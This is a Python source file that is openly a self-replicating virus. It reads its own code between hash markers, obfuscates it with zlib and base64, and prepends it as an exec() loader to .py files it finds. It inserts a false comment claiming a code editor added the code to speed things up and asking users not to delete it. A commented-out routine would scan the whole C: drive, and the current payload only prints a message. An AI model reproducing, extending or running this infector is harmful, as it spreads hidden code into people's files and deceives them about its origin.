# begin-bd4939b3c3376353df571c01539d0535

import base64
import glob
import hashlib
import inspect
import os
import random
import zlib
import ctypes
import random
import time

def get_content_of_file(file):
  data = None
  
  with open(file, "r") as my_file:
    data = my_file.readlines()

  return data
  
def get_content_if_infectable(file, hash):
  
  data = get_content_of_file(file)

  for line in data:
    if hash in line:
      return None

  return data

def obscure(data: bytes) -> bytes:
  
    return base64.urlsafe_b64encode(zlib.compress(data, 9))

def transform_and_obscure_virus_code(virus_code):
  new_virus_code = []
  check = False
  for line in virus_code[1:-1]:
    
    if not check and "exec(\"import zlib\\nimport base64\\nexec" in line:
  
      check = True
    new_virus_code.append("# "+ str(random.randrange(1000000))+ "\n")
    new_virus_code.append(line + "\n")

  obscured_virus_code = obscure(bytes("".join(new_virus_code), 'utf-8'))
  return obscured_virus_code,check

def search_in_directories(directories, file_extension=".py"):
    search_results = []
    for directory in directories:
        for root, dirs, files in os.walk(directory, topdown=True, onerror=lambda e: None):
            for file in files:
                if file.endswith(file_extension):
                    search_results.append(os.path.join(root, file))
  
    return search_results

"""
# this is the code to search in the whole drive

def search_windows(file_extension=".py", drive="C:\\"):
    search_results = []
    for root, dirs, files in os.walk(drive, onerror=lambda e: None):  # Skip inaccessible directories
        for file in files:
            if file.endswith(file_extension):
                search_results.append(os.path.join(root, file))

    return search_results
"""

def find_files_to_infect(directory = "."):
  return [file for file in glob.glob("*.py")]

def summon_chaos():
  print("summon chaos")

 
      


def infect(file, virus_code):
  
  hash = hashlib.md5(file.split("\\")[-1].encode("utf-8")).hexdigest()
  if (data:=get_content_if_infectable(file, hash)):
    obscured_virus_code,_ = transform_and_obscure_virus_code(virus_code)
    viral_vector = "exec(\"import zlib\\nimport base64\\nexec(zlib.decompress(base64.urlsafe_b64decode("+str(obscured_virus_code)+")))\")"
   
    

    with open(file, "w") as infected_file:
      msg = "\n# The code below has been added by the code editor to make your code run faster. Please do not delete it. \n"
      infected_file.write("\n# begin-"+ hash  + msg +  viral_vector + "\n# end-" + hash + "\n")
      infected_file.writelines(data)

def get_virus_code():
  virus_code_on = False
  virus_code = []
  virus_hash =  hashlib.md5(os.path.basename(__file__).encode("utf-8")).hexdigest()
  print("v",os.path.basename(__file__),virus_hash)
  code = get_content_of_file(__file__)

  for line in code:
    if "# begin-" + virus_hash in line:
      virus_code_on = True

    if virus_code_on:
      virus_code.append(line + "\n")

    if "# end-" + virus_hash in line:
      virus_code_on = False
      break
 
  return virus_code


try:
  virus_code = get_virus_code()
 
  dir = []
  for file in search_in_directories(dir):
    infect(file, virus_code)

  summon_chaos()

except Exception as e:
  print(e)

# end-bd4939b3c3376353df571c01539d0535